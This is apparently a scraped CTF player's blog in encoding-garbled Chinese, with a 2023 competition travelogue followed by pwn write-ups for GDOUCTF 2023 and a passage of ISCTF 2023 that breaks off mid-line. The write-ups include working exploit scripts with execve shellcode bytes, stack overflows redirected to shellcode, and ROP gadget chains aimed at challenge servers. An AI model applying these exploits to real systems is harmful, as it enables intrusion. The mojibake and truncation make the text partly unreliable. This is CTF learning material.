CTFs&#x2F;trevels_p1åƒç€ç«é”…å”±ç€æ­Œå°±æŠŠå¥–æ‹¿äº†ï¼Œè¿™å¤šæ˜¯ä¸€ä»¶ç¾äº‹å•Šç¬¬ä¸€åœºçº¿ä¸‹èµ›æ˜¯é—½ç›¾æ¯çš„å†³èµ›æ¸—é€ã€‚ç¬¬ä¸€æ¬¡å•äººåé£æœºå‡ºè¿œé—¨ï¼Œç¦å·ä¸é”™çš„ï¼Œå°±æ˜¯ä½çš„å¤ªç»æµäº†ï¼Œæœ‰ç‚¹éš¾ç»·å»å¹´åˆèµ›â€œç½‘ç»œå®‰å…¨æ²¡æœ‰å¼€å·è€ƒâ€å¯ä»¥ç¬‘ä¸€å¹´,æ›´éš¾ç»·çš„æ˜¯é˜Ÿé‡Œçš„ä¸»åŠ›å»æ‰“ä¸Šæµ·å¸‚èµ›äº†ï¼Œå‰©ä¸‹ä¿©äºŒè¿›åˆ¶æ‰‹å»é—½ç›¾ç­¾åˆ°ä½“éªŒ+åç‰¢æ¸—é€ï¼Œå•¥ä¸ä¼šï¼Œæ²¡è¿›å»ï¼ŒKFCå¾ˆå¥½åƒï¼Œç¦å¸ˆå¤§åŠæ—¥æ¸¸ã€‚\næ¥ä¸‹æ¥å¥½åƒå°±å›½èµ›äº†ï¼Œåˆèµ›æäº†ä¸ªcanaryçˆ†ç ´ä¸é”™çš„ï¼Œéº»å°†é‚£é¢˜æœ€éš¾ç»·å†³èµ›å»äº†æ¡‚æ—ã€‚ä»æ¹›æ±Ÿåç»¿çš®ç«è½¦åˆ°æ¡‚æ—åäº†åä¸€ä¸ªå°æ—¶\nfrom lifepwn import *success(&quot;ç«è½¦é€šå®µ&quot;)\nè·Ÿåå—çš„å¸ˆå‚…ä»¬é¢åŸºäº†ä¸¤æ³¢ï¼Œä¸€æ¬¡æ™šä¸Šçº¦é¥­ä¸€æ¬¡ç«è½¦ç«™ï¼Œè§åˆ°äº†ä¸­å¤§åå¸ˆçš„å¤§ä½¬ä»¬ï¼Œæ¡‚ç”µä¸€æ—¥æ¸¸pwnçˆ†é›¶,é˜Ÿå‹å¸¦æˆ‘æ‹¿ä¸‹ä¸‰ç­‰å¥–å›å®¶)\nvoid how2heap&#x2F;how2web(time)æ•´ä¸ªæš‘å‡åŸºæœ¬éƒ½åœ¨è·Ÿç€how2heapé¡¹ç›®ã€pwnç«èµ›æŒ‡å—å’ŒCTFwikiå»çœ‹å †å­¦å †ï¼Œæ²¡æœ‰å¤§ä½¬å¸¦ï¼Œç¡¬å•ƒï¼Œå¾ˆéš¾å—ä½†å­¦åˆ°å¾ˆå¤šæƒŠå¹äºè®¡ç®—æœºä¹‹ç¾ï¼Œæ²‰æººäºäºŒè¿›åˆ¶ä¹‹é“\nè¿˜åœ¨çº¿ä¸Šå¬äº†binXçš„æ¸—é€è¯¾å’Œå±±çŸ³çš„å¤ä»¤è¥ï¼Œæ„Ÿè§‰æ¸—é€æ²¡å®æ“è¿˜æ˜¯å¬äº†&#x3D;ä¸ä¼šï¼Œä½†æ˜¯ç†Ÿæ‚‰äº†ä¸€äº›æµç¨‹ã€‚\næ‰“äº†è“å¸½æ¯å’Œç¾ŠåŸæ¯çš„åˆèµ›ã€‚ç¾ŠåŸæ¯åˆèµ›æ˜¯çœŸçš„å¤§å¼€çœ¼ç•Œï¼Œå¼‚æ„(risc-V)ã€musl-libcã€è‡ªå®ç°vmçš„opcodeã€pop&#x2F;push onlyçš„shellcodeé¢˜ç›®,è¿™ä¸‹çœŸborden my Hor1zonäº†ã€‚\nè¿˜æœ‰å°±æ˜¯æœ¬åšå®¢ï¼Œä¹Ÿæ˜¯åœ¨æš‘å‡çš„æ—¶å€™æ­èµ·æ¥çš„ï¼Œæ„Ÿè§‰è¿˜æ˜¯éœ€è¦è®°å½•ä¸‹è‡ªå·±çš„å­¦ä¹ ï¼Œå½“ç§ç”°æ¥æ‰“ç†å¯¹æˆ‘æ¥è¯´åŠ¨åŠ›ä¹Ÿä¸å°ã€‚\ndef CTFs&#x2F;trevels_p2è¿™ä¸ªå­¦æœŸå¼ºåº¦æé«˜ï¼Œå†åŠ ä¸Šå­¦æ ¡æ–¹é¢çš„ä¸œè¥¿ï¼Œæˆ‘åªèƒ½è¯´æ²¡æŠŠäººæ‰“æ­»å°±ä¸é”™äº†ï¼Œä½†æ˜¯å¾ˆå¼€å¿ƒå¼€å­¦ç›´å†²ç¾ŠåŸæ¯å†³èµ›ï¼Œè·Ÿç€å±±çŸ³ç½‘ç§‘æ‰“çš„ï¼Œä½†æ˜¯awdpæ²¡ä»€ä¹ˆè´¡çŒ®ï¼Œæœ‰ç‚¹å°éš¾å—æ¥ä¸‹æ¥æ˜¯è“å¸½æ¯çš„åŠå†³èµ›ï¼Œå¹¿å·é£è´µé˜³æœ‰å»¶è¯¯ï¼Œæ™šåˆ°å¾ˆå¤šï¼Œä½†è¿˜å¥½æœ‰æ—¶é—´ç¡è§‰ã€‚å‡ºäº†ä¸€é¢˜UAFï¼Œå¾ˆèˆ’æœã€‚æ‰“å¡è´µè­¦\nç„¶åå»äº†ISCCçº¿ä¸‹ï¼Œä»é˜³æ±Ÿä¸€è·¯é«˜é“åˆ°åŒ—äº¬\nfrom lifepwn import *success(&quot;é«˜é“é€šå®µ&quot;)\næ‰“å¡åŒ—ç†å·¥ã€‚çº¿ä¸‹èµ›åˆ¶æˆ‘è§‰å¾—è¿˜æ˜¯ä¸é”™çš„ï¼Œå°±æ˜¯é«˜ä½åœ°çš„è®¾å®šæœ‰ç‚¹é«˜ä¼°å‚èµ›é€‰æ‰‹äº†ï¼Œæ”¾é¢˜çš„æ—¶é—´ä¹Ÿå¾ˆæ€ªï¼Œæ™šä¸Šçš„å¤§æ¨¡å‹æ³¨å…¥æŒºå¥½ç©ï¼Œå°±æ˜¯æ—¶é—´ä¸å¤Ÿã€‚æ°´æŠ¥å‘ŠæŠŠpwné¢˜çš„ç‚¹å…¨æ°´ä¸­äº†ï¼Œå¸®é˜Ÿä¼æ‹¿ä¸‹ä¸‰ç­‰å¥–ï¼Œå¾ˆèˆ’æœã€‚å›ç¨‹ç æµ·åŠæ—¥æ¸¸ï¼Œè·¯è¿‡æ‰“å¡ç å‰å¤§ï¼ˆç°ç ç§‘ï¼‰ã€‚è·¯è¿‡æ¨ªç´å£å²¸ã€‚\nè¿‡äº†å¥½åƒåŠä¸ªæœˆåˆå»äº†è“å¸½æ¯æ€»å†³èµ›ï¼Œè¿™æ¬¡ä½“éªŒäº†ä¸€æ³¢787å¤´ç­‰èˆ±ï¼Œä¸æ„§æ˜¯æ¢¦æƒ³å¤§ç°æœºæ‰“å¡å…¬å¤§ï¼ˆæ²¡æœ‰åœ¨æ ¡å›­é‡Œæ‹ç…§æœ‰ç‚¹å¯æƒœ(å¯èƒ½ä¸èƒ½æ‹ï¼Ÿ)ï¼‰ç­¾ä¸‹å››ä¸ªä¸‰ç­‰å¥–(ä¹),å®æ™¯æ¸—é€è èœç½‘ç«™ï¼ŒçœŸä¸ä¼šç©ã€‚å›æ¥çš„æ—¶å€™å› ä¸ºå¤§é›¾æ™šäº†ä¸€å¤©å›å­¦æ ¡ï¼Œæ­£å¥½é‡ä¸Šä¸€æ¶å› ä¸ºè¢«æŠ•ç¡¬å¸æ™šé£çš„B-777æ‰å›æ¥ã€‚\nfrom lifepwn import*success(&quot;é£æœºå»¶è¯¯åˆ°ç¬¬äºŒå¤©&quot;)\nä¸¤æ¬¡åŒ—äº¬æ²¡å»æˆæ¸…åŒ—æœ‰ç‚¹å°é—æ†¾\nç„¶åæ‰“äº†é‡‘ç –-ä¸€å¸¦ä¸€è·¯ï¼Œè¿™ä¸ªèµ›åˆ¶å’Œä¸»åŠæ–¹éƒ½æå…¶æŠ½è±¡ï¼Œç¬¬ä¸€æ¬¡è§‰å¾—å¤§ä¸“ä¹‹é—´äº¦æœ‰å·®è·()ã€‚ä¸‹åˆawdå¦å¤–ä¸€é˜Ÿåƒç€ç«é”…å”±ç€æ­Œå°±ç”¨sshæŠŠæ‰€æœ‰äººçš„æœºå­éƒ½æ©„æ¦„äº†ï¼Œæˆ‘ä»¬è¿™è¾¹ä¸Šäº†ä¸ªé€šé˜²ä¸€ç›´è¢«checkæ‰£åˆ†ï¼ˆå¯„ï¼ï¼‰ï¼Œä½†æ˜¯CTFåˆ†æ•°é«˜æ‹¿ä¸‹é“¶ç‰Œ:)æ‰“å¡æ­¦å¤§,æœ€ç¾¡æ…•çš„ä¸€é›†\né©¬ä¸åœè¹„ç¬¬äºŒå¤©ç›´å†²é¹åŸæ¯(é‚£é‡Œæœ‰ä¸¤ä¸ªåšäº†ä¸¤å¤©ç‰¢çš„é˜Ÿå‹)ï¼Œåˆ«é—®ï¼Œé—®å°±æ˜¯åç‰¢ä¹Ÿå¾—ä¸€èµ·ã€‚ä½†æ˜¯æ‰“å¡é¹åŸå®éªŒå®¤+å¤§ç–†æ€»éƒ¨åœºæ™¯å¾ˆå¸…å¾ˆçœŸï¼Œä½†æˆ‘ä¸ä¼š:)\næœ€åæ˜¯CICS2023çš„å¤èµ›(é˜Ÿé•¿@g0atéƒ½å¿˜äº†ä»€ä¹ˆæ—¶å€™æ‰“çš„å“ˆå“ˆå“ˆ)ï¼Œç”±äºæœ‰è€ƒè¯•ç¬¬äºŒå¤©æ—©ä¸Šæ‰æ‰“ç§¯åˆ†èµ›çŒ›å†²é€‰æ‹©+GPT-plcçŒ›çŒ›å†²åˆ†ï¼Œæˆ‘æ˜¯plcå¤§å¸ˆ.jpgã€‚ä¸‹åˆç©è½¦è”ç½‘å› ä¸ºè®¾å¤‡é—®é¢˜æ²¡çœ‹æ›´å¤šé¢˜æ¯”è¾ƒå¯æƒœã€‚ç¬¬äºŒå¤©æ—©ä¸Šçš„è·¨å¢ƒæ•°æ®ä½æ›´å¯„ï¼Œè¿˜å¥½g0atâœŒä¼šç‚¹å·¥ä¸šæµé‡ã€‚ä¸‹åˆæ¸—é€ç«ç”µå‚+ç§¯åˆ†èµ›ã€‚æœ€å2v4ä»¥30åå«åº•è¿›å†³èµ›ï¼Œæ˜å¹´å—äº¬å®‰æ’ä¸Šã€‚æ¥è§¦äº†è½¦è”ç½‘ï¼Œçœ‹äº†ä¸‰è±å’Œè¥¿é—¨å­çš„plcï¼ŒåŠ›å‹Redbudå’ŒbinXï¼ˆè¿™åœºç¡®å®ï¼‰ï¼Œæµ·å¸¦æœ€winçš„ä¸€é›†å•äººåèˆ¹è¿‡æµ·å³¡+æ‰“å¡çœŸæµ·å¤§+è·¨å¹´ä¹‹æˆ˜+ç¬¬ä¸€æ¬¡å¼‚åœ°è·¨å¹´ã€‚\nvoid exit()2023åˆ°æ­¤ç»“æŸï¼Œæ˜å¹´æ¥ç€å¼€å†²\nå†™äº2024.1.1,äºç¼å·æµ·å³¡èˆ¹ä¸Š\n","categories":["å‘ç”µ"],"tags":["å‘ç”µ"]},{"title":"GDOUCTF2023_pwn","url":"/2023/07/20/GDOUCTF2023-pwn/","content":"æ¸©æ•…è€ŒçŸ¥æ–°[GDOUCTF 2023]çœŸç”·äººä¸‹120å±‚\nv9 = __readfsqword(0x28u);  setbuf(_bss_start, 0LL);  v3 = time(0LL);  srand(v3);  v8 = 2772839826LL;  v4 = rand();  srand(v4 % 3 - 1522127470);...... if ( rand() % 4 + 1 != v6 )    &#123;      printf(&quot;\\x1B[31m&quot;);      puts(&quot;YOU DIED!&quot;);      printf(&quot;\\x1B[0m&quot;);      return 0;    &#125;    system(&quot;clear&quot;);  puts(&quot;Congratulation!&quot;);  cat_flag();  \nå·²çŸ¥ç§å­éšæœºæ•°ç§å­æœ‰ä¸‰ç§æƒ…å†µï¼š0 - 15221274701 - 15221274702 - 1522127470\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;        int b;        //srand(0 - 1522127470);        srand(1 - 1522127470);        //srand(2 - 1522127470);//ä¸‰é€‰ä¸€ï¼Œä¸è¡Œå¤šè·‘å‡ æ¬¡        for (int i = 1; i &lt;=120; i++)&#123;                b = rand() % 4 + 1;                printf(&quot;\\&#x27;%d\\&#x27;,&quot;, b);        &#125;        return 0;&#125;\nfrom pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)io = remote(&#x27;node5.anna.nssctf.cn&#x27;,28310)s = [&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,]for i in range(120):  io.recv()   io.sendline(str(s[i]))  io.recv()io.recv()io.recv()\né¶æœºéšæœºæ•°ç”Ÿæˆå¯èƒ½ä¸ä¸€æ ·ï¼Œå¤šè¯•å‡ æ¬¡[GDOUCTF 2023]å°å­¦æ•°å­¦\nimport randomimport signaldef ran():    return random.randint(999,99999)def add():    question = f&quot;&#123;ran()&#125; + &#123;ran()&#125; = &quot;    print(question.replace(&#x27;+&#x27;,&#x27;-&#x27;))    answer = eval(question[:-2])        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)def sub():    question = f&quot;&#123;ran()&#125; - &#123;ran()&#125; = &quot;    print(question.replace(&#x27;-&#x27;,&#x27;x&#x27;))    answer = eval(question[:-2])        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)def mul():    question = f&quot;&#123;ran()&#125; x &#123;ran()&#125; = &quot;    print(question.replace(&#x27;x&#x27;,&#x27;//&#x27;))    answer = eval(question[:-2].replace(&#x27;x&#x27;,&#x27;*&#x27;))        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)def div():    question = f&quot;&#123;ran()&#125; // &#123;ran()&#125; = &quot;    print(question.replace(&#x27;//&#x27;,&#x27;%&#x27;))    answer = eval(question[:-2])        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)def mod():    question = f&quot;&#123;ran()&#125; % &#123;ran()&#125; = &quot;    print(question.replace(&#x27;%&#x27;,&#x27;+&#x27;))    answer = eval(question[:-2])        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)print(&quot;  ____ ____   ___  _   _    ____ _____ _____ &quot;)print(&quot; / ___|  _ \\ / _ \\| | | |  / ___|_   _|  ___|&quot;)print(&quot;| |  _| | | | | | | | | | | |     | | | |_   &quot;)print(&quot;| |_| | |_| | |_| | |_| | | |___  | | |  _|  &quot;)print(&quot; \\____|____/ \\___/ \\___/   \\____| |_| |_|    &quot;)print(&quot;\t\t\t\t\t\t\t\t\t\t\t\t&quot;)print(&quot;Welcome to the calculate challenge. Please try to solve 300 Question in 600 seconds.&quot;)print(&quot;ATTENTION: This is an April Fool&#x27;s game, and the real problem may not be what it seems&quot;)print(&quot;&quot;)input(&quot;Press Enter to start...&quot;)signal.alarm(600)for i in range(300):    print(&quot;Round: &quot;+str(i+1))    random.choice([add,sub,mul,div,mod])()flag = open(&#x27;/flag&#x27;).read()print(&quot;Congratulations on passing the challenge. This is your flag: &quot; + str(flag))\n\nfrom pwn import *context.log_level = &#x27;debug&#x27;p = remote(&#x27;node2.anna.nssctf.cn&#x27;,29000)io.sendline(b&#x27;&#x27;)print(&#x27;plz wait..&#x27;)for i in range(300):    io.recvuntil(str(i+1).encode())    num1 = int(io.recvuntil(b&#x27; &#x27;))    op = io.recvuntil(b&#x27; &#x27;)    num2 = int(io.recvuntil(b&#x27; &#x27;))    print(num1, op[0], num2)    if(op[0] == ord(&#x27;-&#x27;)):        io.sendline(str(num1+num2).encode())    elif(op[0] == ord(&#x27;x&#x27;)):        io.sendline(str(num1-num2).encode())    elif(op[0] == ord(&#x27;/&#x27;)):        io.sendline(str(num1*num2).encode())    elif(op[0] == ord(&#x27;%&#x27;)):        io.sendline(str(num1//num2).encode())    else:        io.sendline(str(num1%num2).encode())io.interactive()\n\n\n[GDOUCTF 2023]å¥‡æ€ªçš„ELFLinux1ç›´æ¥è¿è¡Œå°±è¡ŒLinux2æ˜¯armæ¶æ„ä¸‹ç¼–è¯‘çš„ï¼Œèµ°é€†å‘\n.data:0000000000003A60                               ; char flag[17].data:0000000000003A60 F2 EE E3 D9 CA EF E8 F3 FE D9+flag DCB 0xF2, 0xEE, 0xE3, 0xD9, 0xCA, 0xEF, 0xE8, 0xF3, 0xFE, 0xD9, 0xF1, 0xE9, 0xF4, 0xEA, 0xE2, 0xA7, 0xFB\nflag =[0xCE, 0xDC, 0xC5, 0xD2, 0xC0, 0xFD, 0xF1, 0xE3, 0xEA, 0xE5, 0xE9, 0xEB, 0xE3, 0xD9, 0xF2, 0xE9, 0xD9,  0xF2, 0xEE, 0xE3, 0xD9, 0xCA, 0xEF, 0xE8, 0xF3, 0xFE, 0xD9,   0xF1, 0xE9, 0xF4, 0xEA, 0xE2, 0xA7, 0xFB] #flag1+flag2for i in flag:    print(chr(i^0x86),end=&#x27;&#x27;)\nHZCTF{welcome_to_the_Linux_world!}[GDOUCTF 2023]EASY PWN\nint check()&#123;  int result; // eax  char buf[10]; // [rsp+7h] [rbp-29h] BYREF  char s1[15]; // [rsp+11h] [rbp-1Fh] BYREF  ssize_t v3; // [rsp+20h] [rbp-10h]  int fd; // [rsp+28h] [rbp-8h]  int v5; // [rsp+2Ch] [rbp-4h]  v5 = 0;  fd = open(&quot;/dev/urandom&quot;, 0);  if ( fd &lt; 0 )  &#123;    puts(&quot;Can&#x27;t access /dev/urandom.&quot;);    exit(1);  &#125;  v3 = read(fd, buf, 0xAuLL);  if ( v3 &lt; 0 )  &#123;    puts(&quot;Data not received from /dev/urandom&quot;);    exit(1);  &#125;  close(fd);  puts(&quot;Password:&quot;);  gets(s1);  result = strcmp(s1, buf);  if ( result )    result = puts(&quot;I swore that was the right password ...&quot;);  else    v5 = 1;  if ( v5 )  &#123;    puts(&quot;Guess I couldn&#x27;t gaslight you!&quot;);    return print_flag();  &#125;  return result;&#125;\næŠŠv5è¦†ç›–æˆä¸ä¸º0çš„å€¼å³å¯[GDOUCTF 2023]Shellcode\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[10]; // [rsp+6h] [rbp-Ah] BYREF  setbuf(stdin, 0LL);  setbuf(stderr, 0LL);  setbuf(stdout, 0LL);  mprotect((void *)((unsigned __int64)&amp;stdout &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7);  puts(&quot;Please.&quot;);  read(0, &amp;name, 0x25uLL);  puts(&quot;Nice to meet you.&quot;);  puts(&quot;Let&#x27;s start!&quot;);  read(0, buf, 0x40uLL);  return 0;&#125;\nå¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªreadå¯ä»¥æŠŠè¾“å…¥çš„ä¸œè¥¿ç›´æ¥å†™å…¥.bssæ®µï¼Œç¬¬äºŒä¸ªreadå­˜åœ¨æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œæ‰€ä»¥æ€è·¯å¾ˆæ˜ç¡®ï¼Œç¬¬ä¸€æ¬¡è¾“å…¥å°†shellcodeå†™åœ¨.bssæ®µä¸Šï¼Œå†ç”¨ç¬¬äºŒæ¬¡è¾“å…¥æº¢å‡ºåè·³åˆ°.bssæ®µæ‰§è¡Œshellcodeã€‚å”¯ä¸€å‘ï¼šshellcodeæœ‰é•¿åº¦é™åˆ¶\nfrom pwn import *import sgtlibcelf=ELF(&#x27;./shellcode&#x27;)pop_rdi_addr = 0x4007b3ret_addr = 0x4007ADmain_addr = 0x400687puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]bss_addr = 0x6010a0context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)p = remote(&#x27;node2.anna.nssctf.cn&#x27;,28500)#wrongpayload1 = asm(shellcraft())payload1=&quot;\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x00\\x53\\x54\\x5F\\x31\\xF6\\x31\\xD2\\x6A\\x3B\\x58\\x0F\\x05&quot;p.sendlineafter(&quot;Please.\\n&quot;,payload1)payload2 =  b&#x27;a&#x27;*(0xa+8)+p64(bss_addr) p.sendlineafter(&#x27;start!\\n&#x27;,payload2)p.interactive()\nè´´ä¸¤ä¸ªä¼ é€é—¨ï¼šhttps://www.roderickchan.cn/zh-cn/2023-02-20-the-art-of-shellcode &#x2F;&#x2F;art of the shellcode            https://defuse.ca/online-x86-assembler.htm#disassembly  &#x2F;&#x2F;ç¼–è¯‘shellcodeçš„ç½‘ç«™\n[GDOUCTF 2023]Randomå¼€äº†æ²™ç›’\nstr1k3@ubuntu:~/Desktop$ seccomp-tools dump &#x27;/var/run/vmblock-fuse/blockdir/QC26KN/RANDOM&#x27;  line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005 0004: 0x06 0x00 0x00 0x00000000  return KILL 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n0x60100åˆ°0x60200è¿™æ®µå†…å­˜å¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œæ‰€ä»¥å°è¯•æŠŠshellcodeå†™å…¥è¿™æ®µåå°†æ‰§è¡ŒæµåŠ«æŒåˆ°è¯¥æ®µhahaå‡½æ•°å†…å­˜åœ¨jmp rspæŒ‡ä»¤\nfrom pwn import *from ctypes import *  context.arch=&#x27;amd64&#x27;# è¿æ¥è¿œç¨‹p = remote(&quot;node6.anna.nssctf.cn&quot;,28969)# åŠ è½½randå‡½æ•°çš„æ‰€åœ¨å‡½æ•°åº“libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)libc.srand(libc.time(0))#è®¾ç½®srandå‡½æ•°jmp_sp = 0x40094Edata_addr = 0x601000#é€šè¿‡éšæœºæ•°éªŒè¯  ç¨‹åºä¼šè·³è½¬åˆ°vulnerableå‡½æ•°p.sendlineafter(&quot;num:&quot;,str(libc.rand()%50))&quot;&quot;&quot;åˆ©ç”¨ jmp_sp + asm çš„æ”»å‡»æ–¹å¼  è®©spæŒ‡é’ˆè·³å›å˜é‡åœ°å€ æ‰§è¡Œshellcode:     åœ¨data_addr 0x601000 å†™å…¥orw_shellcodeå    å¹¶è·³è½¬æ‰§è¡Œdata_addr 0x12300çš„orw_shellcode&quot;&quot;&quot;payload=asm(shellcraft.read(0,data_addr,0x100))#è°ƒç”¨readå‡½æ•° åœ¨data_addr 0x601000å¤„å†™å…¥ orw_shellcodeå†…å®¹payload+=asm(&#x27;mov rax,0x601000;call rax&#x27;)#å¹¶ä¸”call axå¯„å­˜å™¨ è°ƒç”¨æ‰§è¡Œ data_addr 0x601000å¤„çš„orw_shellcodepayload=payload.ljust(0x28,b&#x27;\\x00&#x27;)#æ‰“æ»¡å˜é‡ç©ºé—´ å’Œ rbpå¯„å­˜å™¨çš„å­—èŠ‚payload+=p64(jmp_sp)#è¿”å›åœ°å€å†™æˆjmp_espï¼Œç»§ç»­è¿è¡Œå½“å‰spåç»­æŒ‡ä»¤ å¡«å†™åˆ«çš„è¿”å›åœ°å€ å°±æ— æ³•æ§åˆ¶ç¨‹åºåé¢çš„æ‰§è¡Œæµç¨‹äº†payload+=asm(&#x27;sub rsp,0x30;jmp rsp&#x27;)#æ­¤æ—¶spå·²ç»ç¦»shellcodeåœ°å€åç§»0x30,è¿™é‡ŒæŠŠspæŒªå›åˆ°shellcodeåœ°å€ å¹¶è·³è½¬åˆ°shellcodep.sendlineafter(&quot;your door\\n&quot;,payload)&quot;&quot;&quot;orw_shellcodeæ‰§è¡Œçš„å†…å®¹:æ‰“å¼€æœ¬åœ°çš„flagæ–‡ä»¶ æŠŠflagæ–‡ä»¶å†…å®¹å†™å…¥åˆ° data_addr+0x100æŠŠè¾“å‡ºdata_addr+0x100çš„flagæ–‡ä»¶å†…å®¹&quot;&quot;&quot;orw_shellcode = shellcraft.open(&quot;./flag&quot;)#æ‰“å¼€æœ¬åœ°çš„flagæ–‡ä»¶orw_shellcode += shellcraft.read(3, data_addr+0x100, 0x50)#æ–‡ä»¶æè¿°ç¬¦3:å…¶å®ƒæ‰“å¼€çš„æ–‡ä»¶ flagå†…å®¹å†™å…¥åˆ°data_addr+0x100orw_shellcode += shellcraft.write(1, data_addr+0x100,0x50)#æ–‡ä»¶æè¿°ç¬¦1:è¾“å‡º  åœ°å€data_addr+0x100å­˜å‚¨çš„flagå†…å®¹p.send(asm(orw_shellcode))p.interactive()","categories":["wp"],"tags":["random"]},{"title":"ISCTF_pwn","url":"/2023/12/02/ISCTF-pwn/","content":"éå¸¸å¥½æ¯”èµ›ï¼Œä½¿æˆ‘çš„è„‘è¢‹æ—‹è½¬ISCTF_pwné™„ä»¶ISCTF_wp_written_by_Hor1zon[ISCTF2023 ezpie]checksecä¸»è¦éš¾ç‚¹æ˜¯pieçœ‹çœ‹mainæœ‰ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå› ä¸ºå¼€äº†pieè€ƒè™‘æ³„éœ²ç¨‹åºåŸºå€æ°å¥½æ­¤å¤„èƒ½æ³„éœ²funcçš„åœ°å€\np.send(b&#x27;b&#x27;*(40-3) + b&#x27;v5:&#x27;)# pause()p.recvuntil(b&#x27;v5:&#x27;)v5 = u64(p.recvuntil(b&#x27;\\x0a&#x27;, drop=True) + b&#x27;\\0\\0&#x27;)success(&#x27;func_addr: %s&#x27;+ hex(func_addr))code_base = func_addr - elf.sym[&#x27;func&#x27;]success(&quot;code_base: %s&quot;,hex(code_base) )\né¡ºå¸¦ç€å¾ˆå¤šä¸œè¥¿å°±èƒ½ç”¨äº†,\npop_rdi_ret =code_base + 0x0000000000001333pop_rsi_r15_ret =code_base + 0x0000000000001331ret_addr =code_base + 0x000000000000101aleave_ret =code_base + 0x0000000000001252  # : leave; ret; str_bin_sh =code_base + 0x0000000000002008pop_rax_ret =code_base + 0x00000000000012c8puts_got = code_base + elf.got[&#x27;puts&#x27;]puts_plt = code_base + elf.plt[&#x27;puts&#x27;]main_addr = code_base + elf.sym[&#x27;main&#x27;]syscall = code_base + 0x00000000000012c5pop_all = code_base+ 0x000000000000132cogg = code_base+0xe3afeogg2 = code_base +0xe3b01ogg3 = 